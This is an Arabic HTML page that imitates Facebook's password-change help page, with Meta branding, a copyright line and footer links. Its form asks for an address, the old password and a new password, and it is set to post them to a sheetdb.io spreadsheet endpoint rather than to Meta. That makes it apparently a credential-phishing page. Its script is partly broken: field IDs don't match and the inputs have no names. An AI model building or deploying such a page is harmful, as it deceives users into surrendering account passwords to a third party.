<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تغيير كلمة السر</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            padding: 20px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            position: relative;
            direction: rtl; /* تغيير اتجاه النص إلى اليمين */
        }

        /* الشريط العلوي */
        .header {
            display: flex;
            justify-content: space-between;
            padding: 10px 20px;
            position: fixed;
            top: 0;
            right: 0;
            left: 0;
            width: 100%;
            background-color: #fff;
            z-index: 1000;
            /* تم حذف حدود الخطوط العلوية */
        }

        /* شعار الفيسبوك ومركز المساعدات على اليسار */
        .header .facebook-logo {
            display: flex;
            align-items: center;
            color: #1877f2; /* تغيير اللون إلى الأزرق */
            font-size: 20px;
        }

        .header .facebook-logo i {
            font-size: 30px;
            margin-left: 10px;
        }

        /* محرك البحث */
        .header .search-container {
            display: flex;
            align-items: center;
            margin-left: 20px;
            position: relative;
        }

        .header .search-container input {
            padding: 5px 15px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 14px;
            width: 200px;
        }

        .header .search-container i {
            position: absolute;
            left: 10px;
            font-size: 18px;
            color: #aaa;
        }

        /* صورة الملف الشخصي */
        .header .user-info {
            display: flex;
            align-items: center;
            cursor: pointer;
            margin-left: 20px;
        }

        .header .user-info img {
            border-radius: 50%;
            width: 40px;
            height: 40px;
            margin-left: 10px;
            background-color: #e0e0e0; /* لون خلفية في حالة عدم وجود صورة */
        }

        /* قائمة اللغات */
        .header .language-selector {
            display: flex;
            align-items: center;
            margin-left: 20px;
            cursor: pointer;
        }

        .header .language-selector select {
            padding: 5px 10px;
            font-size: 14px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }

        /* حاوية النموذج */
        .container {
            background-color: #fff;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            border: 1px solid #ccc;
            text-align: right;
            margin-top: 100px;
            position: relative;
            border-radius: 15px;
            padding-bottom: 60px; /* إضافة padding أسفل النموذج */
        }

        h1 {
            color: black;
            text-align: right;
            margin-bottom: 20px;
        }

        hr {
            border: 1px solid #f1f1f1;
            margin-bottom: 20px;
        }

        label {
            font-weight: bold;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0 20px 0;
            display: inline-block;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        .password-note {
            font-size: 14px;
            color: #000000;
            margin-bottom: 10px;
            text-align: center;
        }

        .forgot-password {
            text-align: center;
            margin-top: 10px;
        }

        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .logout-other-devices {
            font-size: 14px;
            color: #000;
            margin-top: 10px;
        }

        .logout-other-devices input[type="checkbox"] {
            margin-left: 10px;
        }

        /* زر حفظ التغييرات أسفل الصفحة */
        .signupbtn {
            padding: 10px 18px;
            width: 100%;
            font-size: 16px;
            margin: 20px 0 0 0;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            background-color: #1877f2;
            color: white;
        }

        .signupbtn:hover {
            background-color: #166fe5;
        }

        /* رسالة الحفظ بنجاح */
        .success-message {
            color: green;
            font-size: 16px;
            font-weight: bold;
            text-align: center;
            margin-top: 20px;
            display: none; /* إخفاء الرسالة بشكل افتراضي */
        }

        /* الروابط أسفل الصفحة */
        .footer-links {
            text-align: center;
            font-size: 12px;
            margin-top: 30px;
            color: #555;
        }

        .footer-links a {
            color: #1877f2;
            text-decoration: none;
            margin: 0 8px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <!-- الشريط العلوي مع الشعار، البحث، صورة الملف الشخصي، وقائمة اللغات -->
    <div class="header">
        <!-- شعار الفيسبوك ومركز المساعدات على اليسار -->
        <div class="facebook-logo">
            <i class="fab fa-facebook"></i> 
            <span>مركز المساعدات</span>
        </div>

        <!-- محرك البحث، صورة الملف الشخصي، وقائمة اللغات على اليمين -->
        <div style="display: flex; align-items: center;">
            <!-- محرك البحث -->
            <div class="search-container">
                <i class="fas fa-search"></i> <!-- إضافة أيقونة البحث داخل محرك البحث -->
                <input type="text" placeholder="البحث...">
            </div>

            <!-- صورة الملف الشخصي -->
            <div class="user-info" onclick="toggleDropdown()">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Default_Pfp.jpg" alt="Profile Picture">
                <span>▼</span>
            </div>

            <!-- قائمة اللغات -->
            <div class="language-selector">
                <select>
                    <option>العربية</option>
                    <option>الإنجليزية</option>
                    <option>الفرنسية</option>
                </select>
            </div>
        </div>
    </div>

    <!-- إضافة الفورم حول المحتوى -->
    <form action="https://sheetdb.io/api/v1/yqo1zg3u32ili" method="post" id="sheetdb-form" >
        <!-- حاوية النموذج -->
        <div class="container">
            <h1>تغيير كلمة السر</h1>
            <hr>

            <div class="password-note">
                كلمة السر يجب أن لا تقل عن 6 أحرف، ويجب أن تتضمن مزيجًا من الأرقام، الأحرف الأبجدية والأحرف الخاصة مثل: `%@$!`
            </div>

            <label for="address"><b>العنوان</b></label>
            <input type="text" id="data[address]" placeholder="أدخل العنوان" required>

            <label for="password"><b>كلمة السر القديمة</b></label>
            <input type="password" id="data[password]" placeholder="أدخل كلمة السر القديمة" required>

            <label for="new-password"><b>كلمة السر الجديدة</b></label>
            <input type="password" id="data[new-password]" placeholder="أدخل كلمة السر الجديدة" required>

            <label for="repeat-password"><b>تكرار كلمة السر الجديدة</b></label>
            <input type="password" id="data[repeat-password]" placeholder="أعد كتابة كلمة السر الجديدة" required>

            <!-- ملاحظة تسجيل الخروج من الأجهزة الأخرى -->
            <div class="logout-other-devices">
                <label>
                    <input type="checkbox" name="logout-devices">
                    تسجيل الخروج من الأجهزة الأخرى
                </label>
            </div>

            <!-- زر حفظ التغييرات -->
            <button type="button" class="signupbtn" onclick="saveChanges()">حفظ التغييرات</button>

            <!-- رابط نسيت كلمة السر -->
            <div class="forgot-password">
                <a href="#">نسيت كلمة السر؟</a>
            </div>

            <!-- رسالة النجاح -->
            <div id="successMessage" class="success-message">تم حفظ التغييرات بنجاح</div>
        </div>
    </form>

    <!-- الروابط أسفل الصفحة -->
    <div class="footer-links">
        <a href="#">حول الخصوصية</a>
        <a href="#">الشروط والسياسات</a>
        <a href="#">Ad Choices</a>
        <a href="#">الوظائف</a>
        <a href="#">ملفات تعريف الارتباط</a>
        <a href="#">إنشاء إعلان</a>
        <a href="#">إنشاء صفحة</a>
        <p>© 2024 Meta</p>
    </div>

    <script>
        // دالة حفظ التغييرات
        function saveChanges() {
            var address = document.getElementById('address').value;
            var oldPassword = document.getElementById('password').value;
            var newPassword = document.getElementById('new-password').value;
            var repeatPassword = document.getElementById('repeat-password').value;

            // التحقق من أن جميع الحقول تم تعبئتها
            if (address && oldPassword && newPassword && repeatPassword) {
                // التحقق من أن كلمة السر الجديدة تطابق تكرارها
                if (newPassword === repeatPassword) {
                    // عرض رسالة النجاح
                    var successMessage = document.getElementById('successMessage');
                    successMessage.style.display = 'block';

                    // إخفاء الرسالة بعد 3 ثوانٍ
                    setTimeout(function() {
                        successMessage.style.display = 'none';
                    }, 3000);
                } else {
                    alert("كلمة السر الجديدة لا تطابق تكرار كلمة السر!");
                }
            } else {
                alert("من فضلك املأ جميع الحقول!");
            }
        }
    </script>
</body>
</html>
